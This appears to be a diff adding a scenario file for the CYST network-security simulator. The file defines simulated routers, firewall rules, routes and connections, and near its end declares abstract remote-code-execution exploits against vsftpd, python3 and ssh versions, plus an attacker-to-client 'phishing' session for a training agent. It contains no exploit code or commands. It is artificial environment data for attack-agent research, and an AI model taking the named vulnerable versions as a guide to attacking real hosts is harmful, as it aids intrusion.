+        "name": "interface_1",
+        "id": "perimeter_router.interface_1"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 2,
+        "ref": "0b3139d9-2c15-4299-921c-97d761926098",
+        "name": "interface_2",
+        "id": "perimeter_router.interface_2"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 3,
+        "ref": "79d7440c-d2ac-462d-9e8e-abb098f39492",
+        "name": "interface_3",
+        "id": "perimeter_router.interface_3"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 4,
+        "ref": "b1bcd138-5f1e-40aa-bb98-a6e435177478",
+        "name": "interface_4",
+        "id": "perimeter_router.interface_4"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.4.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.4.0/24"
+        },
+        "index": 5,
+        "ref": "99011727-e0cf-4e03-969f-1049e678045d",
+        "name": "interface_5",
+        "id": "perimeter_router.interface_5"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.4.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.4.0/24"
+        },
+        "index": 6,
+        "ref": "b759e7c7-9831-4293-8ff7-3c04233c9942",
+        "name": "interface_6",
+        "id": "perimeter_router.interface_6"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.2.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.2.0/24"
+        },
+        "index": 7,
+        "ref": "b0d935bf-b33d-4dd3-98ab-fe0a3d64873c",
+        "name": "interface_7",
+        "id": "perimeter_router.interface_7"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 8,
+        "ref": "bf72b788-aafd-4caa-a859-3862169b912f",
+        "name": "interface_8",
+        "id": "perimeter_router.interface_8"
+      }
+    ],
+    "traffic_processors": [
+      {
+        "py/object": "cyst.api.configuration.network.firewall.FirewallConfig",
+        "default_policy": {
+          "py/object": "cyst.api.network.firewall.FirewallPolicy",
+          "_value": "DENY"
+        },
+        "chains": [
+          {
+            "py/object": "cyst.api.configuration.network.firewall.FirewallChainConfig",
+            "type": {
+              "py/object": "cyst.api.network.firewall.FirewallChainType",
+              "_value": "FORWARD"
+            },
+            "policy": {
+              "py/object": "cyst.api.network.firewall.FirewallPolicy",
+              "_value": "DENY"
+            },
+            "rules": [
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.4.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.4.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.4.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.3.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.3.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.2.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.2.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              }
+            ],
+            "ref": "26fe90b5-7c85-4f7e-8c9b-ed923c8c4db1",
+            "name": "firewall_chain_0",
+            "id": "perimeter_router.firewall_0.firewall_chain_0"
+          }
+        ],
+        "ref": "9383bb37-446b-44bf-88c6-bb40c855ee25",
+        "name": "firewall_0",
+        "id": "perimeter_router.firewall_0"
+      }
+    ],
+    "routing_table": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.RouteConfig",
+        "network": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.2.0/24"
+        },
+        "port": 7,
+        "metric": 100,
+        "ref": "ffbb7657-7f72-44b6-bf79-4b6ae79beb15",
+        "name": "route_0",
+        "id": "perimeter_router.route_0"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.RouteConfig",
+        "network": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "port": 8,
+        "metric": 100,
+        "ref": "a89ab790-4a52-467c-b4a0-4359e5d5a0e8",
+        "name": "route_1",
+        "id": "perimeter_router.route_1"
+      }
+    ],
+    "ref": "f32815a6-a323-416e-85a4-f20f4f4f1bba",
+    "name": "router",
+    "id": "perimeter_router"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.router.RouterConfig",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 0,
+        "ref": "773fc5e4-ff17-477d-9879-ad58b5f3fdfd",
+        "name": "interface_0",
+        "id": "server_router.interface_0"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 1,
+        "ref": "2c358cd2-eb83-4eca-b56f-322322ec49fe",
+        "name": "interface_1",
+        "id": "server_router.interface_1"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 2,
+        "ref": "60106159-4e0e-40dc-bee1-4bc74b86dbcf",
+        "name": "interface_2",
+        "id": "server_router.interface_2"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 3,
+        "ref": "8e58b847-bb2a-4ef1-acf9-afdf1af5864f",
+        "name": "interface_3",
+        "id": "server_router.interface_3"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 4,
+        "ref": "2d0444dd-18e6-41ec-801a-886dcab78313",
+        "name": "interface_4",
+        "id": "server_router.interface_4"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 5,
+        "ref": "4f0d7e7e-16bd-468f-a335-93d5a72a9869",
+        "name": "interface_5",
+        "id": "server_router.interface_5"
+      }
+    ],
+    "traffic_processors": [
+      {
+        "py/object": "cyst.api.configuration.network.firewall.FirewallConfig",
+        "default_policy": {
+          "py/object": "cyst.api.network.firewall.FirewallPolicy",
+          "_value": "DENY"
+        },
+        "chains": [
+          {
+            "py/object": "cyst.api.configuration.network.firewall.FirewallChainConfig",
+            "type": {
+              "py/object": "cyst.api.network.firewall.FirewallChainType",
+              "_value": "FORWARD"
+            },
+            "policy": {
+              "py/object": "cyst.api.network.firewall.FirewallPolicy",
+              "_value": "DENY"
+            },
+            "rules": [
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.3.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.3.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.3.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.3.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              }
+            ],
+            "ref": "29922616-49f5-41d9-aa57-4a913ba77044",
+            "name": "firewall_chain_0",
+            "id": "server_router.firewall_0.firewall_chain_0"
+          }
+        ],
+        "ref": "6b0dec53-140f-41d3-bbad-8fd594de997d",
+        "name": "firewall_0",
+        "id": "server_router.firewall_0"
+      }
+    ],
+    "routing_table": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.RouteConfig",
+        "network": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "port": 0,
+        "metric": 100,
+        "ref": "43e4c454-d60f-487e-bc55-f5ecb5c229d8",
+        "name": "route_0",
+        "id": "server_router.route_0"
+      }
+    ],
+    "ref": "cc8daf62-b1a4-452d-b5a6-ab30f490e245",
+    "name": "router",
+    "id": "server_router"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.router.RouterConfig",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 0,
+        "ref": "c1edabd5-8045-4457-84db-08465de33cca",
+        "name": "interface_0",
+        "id": "wifi_router.interface_0"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.2.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.2.0/24"
+        },
+        "index": 1,
+        "ref": "4925fe6a-8664-4422-b6f2-3f522cca3857",
+        "name": "interface_1",
+        "id": "wifi_router.interface_1"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.2.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.2.0/24"
+        },
+        "index": 2,
+        "ref": "ecade9e5-9dee-4cbd-a6f8-b8c5f8453662",
+        "name": "interface_2",
+        "id": "wifi_router.interface_2"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.2.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.2.0/24"
+        },
+        "index": 3,
+        "ref": "ac9c6d9b-f300-491f-92b2-e518537f68cd",
+        "name": "interface_3",
+        "id": "wifi_router.interface_3"
+      }
+    ],
+    "traffic_processors": [
+      {
+        "py/object": "cyst.api.configuration.network.firewall.FirewallConfig",
+        "default_policy": {
+          "py/object": "cyst.api.network.firewall.FirewallPolicy",
+          "_value": "DENY"
+        },
+        "chains": [
+          {
+            "py/object": "cyst.api.configuration.network.firewall.FirewallChainConfig",
+            "type": {
+              "py/object": "cyst.api.network.firewall.FirewallChainType",
+              "_value": "FORWARD"
+            },
+            "policy": {
+              "py/object": "cyst.api.network.firewall.FirewallPolicy",
+              "_value": "DENY"
+            },
+            "rules": [
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.2.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.2.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.2.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              },
+              {
+                "py/object": "cyst.api.network.firewall.FirewallRule",
+                "src_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.2.0/24"
+                },
+                "dst_net": {
+                  "py/object": "netaddr.ip.IPNetwork",
+                  "_value": "192.168.1.0/24"
+                },
+                "service": "*",
+                "policy": {
+                  "py/object": "cyst.api.network.firewall.FirewallPolicy",
+                  "_value": "ALLOW"
+                }
+              }
+            ],
+            "ref": "1cdf5849-552f-45b0-886b-980c96c5aaac",
+            "name": "firewall_chain_0",
+            "id": "wifi_router.firewall_0.firewall_chain_0"
+          }
+        ],
+        "ref": "5b10806b-a280-4b3f-bd5c-87577862d375",
+        "name": "firewall_0",
+        "id": "wifi_router.firewall_0"
+      }
+    ],
+    "routing_table": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.RouteConfig",
+        "network": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "port": 0,
+        "metric": 100,
+        "ref": "ec77fbe6-4ee5-4976-b168-08ec725ae887",
+        "name": "route_0",
+        "id": "wifi_router.route_0"
+      }
+    ],
+    "ref": "935cb290-2d23-4b23-9404-c069d7f83cc2",
+    "name": "router",
+    "id": "wifi_router"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "953c7fa0-fd01-4905-ba4a-b26a6a516870",
+    "src_port": 0,
+    "dst_ref": "cc8daf62-b1a4-452d-b5a6-ab30f490e245",
+    "dst_port": 1,
+    "ref": "2dc99e8c-f4d7-4065-b518-a41853a929d7",
+    "name": "connection_0",
+    "id": "connection_0"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "6ebfeeab-0b2e-48c2-8026-bb9700cf9ada",
+    "src_port": 0,
+    "dst_ref": "cc8daf62-b1a4-452d-b5a6-ab30f490e245",
+    "dst_port": 2,
+    "ref": "68a4922d-6bb4-47cf-98e1-a135e00399b3",
+    "name": "connection_1",
+    "id": "connection_1"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "9e9488a8-d3ff-4d18-9014-541919cb4f76",
+    "src_port": 0,
+    "dst_ref": "cc8daf62-b1a4-452d-b5a6-ab30f490e245",
+    "dst_port": 3,
+    "ref": "e0922d5c-a9b9-4cc7-9abd-4d6173a36a2d",
+    "name": "connection_2",
+    "id": "connection_2"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "260d7831-c067-4de3-9043-397d7115f430",
+    "src_port": 0,
+    "dst_ref": "cc8daf62-b1a4-452d-b5a6-ab30f490e245",
+    "dst_port": 4,
+    "ref": "3884e4ca-0eb4-4d4d-bc20-15c06d88ab62",
+    "name": "connection_3",
+    "id": "connection_3"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "56dd6d4a-9e0b-4856-915a-710b62e5ad96",
+    "src_port": 0,
+    "dst_ref": "cc8daf62-b1a4-452d-b5a6-ab30f490e245",
+    "dst_port": 5,
+    "ref": "a2b9bd9b-88aa-4074-9584-08d9fb732008",
+    "name": "connection_4",
+    "id": "connection_4"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "bec9e98a-9c87-43b8-8e9d-5df6188fb871",
+    "src_port": 0,
+    "dst_ref": "f32815a6-a323-416e-85a4-f20f4f4f1bba",
+    "dst_port": 1,
+    "ref": "abaee063-e63b-4291-a536-638fc362b61d",
+    "name": "connection_5",
+    "id": "connection_5"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "249fd74d-4820-47a3-9393-d1ab863fdda7",
+    "src_port": 0,
+    "dst_ref": "f32815a6-a323-416e-85a4-f20f4f4f1bba",
+    "dst_port": 2,
+    "ref": "bb724e29-1292-4b0f-bab1-15ee008f5b08",
+    "name": "connection_6",
+    "id": "connection_6"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "05d1d9e7-8654-49c3-9a97-4aa62d4bd36d",
+    "src_port": 0,
+    "dst_ref": "f32815a6-a323-416e-85a4-f20f4f4f1bba",
+    "dst_port": 3,
+    "ref": "e0438d0b-7273-4fb9-a32c-61ef3a0860cd",
+    "name": "connection_7",
+    "id": "connection_7"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "cf5d5def-9182-4caa-ba18-dde78cb3b1dd",
+    "src_port": 0,
+    "dst_ref": "f32815a6-a323-416e-85a4-f20f4f4f1bba",
+    "dst_port": 4,
+    "ref": "087b7f0d-c0dd-443a-b38a-725b9677b96c",
+    "name": "connection_8",
+    "id": "connection_8"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "51afb0d4-9354-41f5-9d05-575137608659",
+    "src_port": 0,
+    "dst_ref": "f32815a6-a323-416e-85a4-f20f4f4f1bba",
+    "dst_port": 5,
+    "ref": "3df593f5-fc81-472a-82d2-0133e3121d20",
+    "name": "connection_9",
+    "id": "connection_9"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "eeea5b67-3a23-4e5a-8551-cd101899f4fa",
+    "src_port": 0,
+    "dst_ref": "f32815a6-a323-416e-85a4-f20f4f4f1bba",
+    "dst_port": 6,
+    "ref": "459815de-81eb-4bc3-a2eb-b6c081e06fcf",
+    "name": "connection_10",
+    "id": "connection_10"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "33e86874-1112-48ff-a926-7b38a370b4ef",
+    "src_port": 0,
+    "dst_ref": "935cb290-2d23-4b23-9404-c069d7f83cc2",
+    "dst_port": 1,
+    "ref": "ab8fa17b-5b68-4c7e-b142-01860f819ea3",
+    "name": "connection_11",
+    "id": "connection_11"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "d1f93acc-f923-4371-8540-a2863e419e2c",
+    "src_port": 0,
+    "dst_ref": "935cb290-2d23-4b23-9404-c069d7f83cc2",
+    "dst_port": 2,
+    "ref": "6e1002f8-c99a-48e2-bad2-d5775d6ffca4",
+    "name": "connection_12",
+    "id": "connection_12"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "ebb7bf81-f097-48ec-a611-2e4f04cdd68f",
+    "src_port": 0,
+    "dst_ref": "935cb290-2d23-4b23-9404-c069d7f83cc2",
+    "dst_port": 3,
+    "ref": "8fefd679-9b71-4d44-a3ad-0fa517cbd287",
+    "name": "connection_13",
+    "id": "connection_13"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "f32815a6-a323-416e-85a4-f20f4f4f1bba",
+    "src_port": 7,
+    "dst_ref": "935cb290-2d23-4b23-9404-c069d7f83cc2",
+    "dst_port": 0,
+    "ref": "6b0a14ba-bd88-448e-b09a-45e7c0d9d10d",
+    "name": "connection_14",
+    "id": "connection_14"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.ConnectionConfig",
+    "src_ref": "f32815a6-a323-416e-85a4-f20f4f4f1bba",
+    "src_port": 8,
+    "dst_ref": "cc8daf62-b1a4-452d-b5a6-ab30f490e245",
+    "dst_port": 0,
+    "ref": "28d843d7-1e17-4342-8b66-754b6b689ba6",
+    "name": "connection_15",
+    "id": "connection_15"
+  },
+  {
+    "py/object": "cyst.api.configuration.logic.exploit.ExploitConfig",
+    "services": [
+      {
+        "py/object": "cyst.api.configuration.logic.exploit.VulnerableServiceConfig",
+        "service": "vsftpd",
+        "min_version": "2.3.4",
+        "max_version": "0.0.0",
+        "ref": "80185cf3-ed32-4177-998e-de64d7e543c0",
+        "name": "vulnerable_service_0",
+        "id": "exploit_0.vulnerable_service_0"
+      }
+    ],
+    "locality": {
+      "py/object": "cyst.api.logic.exploit.ExploitLocality",
+      "_value": "REMOTE"
+    },
+    "category": {
+      "py/object": "cyst.api.logic.exploit.ExploitCategory",
+      "_value": "CODE_EXECUTION"
+    },
+    "parameters": null,
+    "ref": "c60d2c16-aea2-4313-b0b4-f876c560ad99",
+    "name": "exploit_0",
+    "id": "exploit_0"
+  },
+  {
+    "py/object": "cyst.api.configuration.logic.exploit.ExploitConfig",
+    "services": [
+      {
+        "py/object": "cyst.api.configuration.logic.exploit.VulnerableServiceConfig",
+        "service": "python3",
+        "min_version": "3.11.1",
+        "max_version": "3.11.1",
+        "ref": "2b308782-da24-438b-afdf-2633b9b672c0",
+        "name": "vulnerable_service_0",
+        "id": "phishing_exploit.vulnerable_service_0"
+      }
+    ],
+    "locality": {
+      "py/object": "cyst.api.logic.exploit.ExploitLocality",
+      "_value": "REMOTE"
+    },
+    "category": {
+      "py/object": "cyst.api.logic.exploit.ExploitCategory",
+      "_value": "CODE_EXECUTION"
+    },
+    "parameters": null,
+    "ref": "885c40d2-a3bb-4f0e-b8fc-312f3e36857e",
+    "name": "exploit",
+    "id": "phishing_exploit"
+  },
+  {
+    "py/object": "cyst.api.configuration.logic.exploit.ExploitConfig",
+    "services": [
+      {
+        "py/object": "cyst.api.configuration.logic.exploit.VulnerableServiceConfig",
+        "service": "ssh",
+        "min_version": "5.1.4",
+        "max_version": "5.1.4",
+        "ref": "12381675-b3d7-4c93-8a7d-23071ee001a5",
+        "name": "vulnerable_service_0",
+        "id": "exploit_1.vulnerable_service_0"
+      }
+    ],
+    "locality": {
+      "py/object": "cyst.api.logic.exploit.ExploitLocality",
+      "_value": "REMOTE"
+    },
+    "category": {
+      "py/object": "cyst.api.logic.exploit.ExploitCategory",
+      "_value": "CODE_EXECUTION"
+    },
+    "parameters": null,
+    "ref": "29bac351-972a-4fc3-a492-af62773d7004",
+    "name": "exploit_1",
+    "id": "exploit_1"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.elements.SessionConfig",
+    "src_service": "netsecenv_agent",
+    "dst_service": "python3",
+    "waypoints": [
+      "node_attacker",
+      "perimeter_router",
+      "node_client1"
+    ],
+    "reverse": false,
+    "ref": "5fc11d10-0e30-4360-82b5-f33c3ee4fa9e",
+    "name": "session",
+    "id": "phishing_session"
+  }
+]
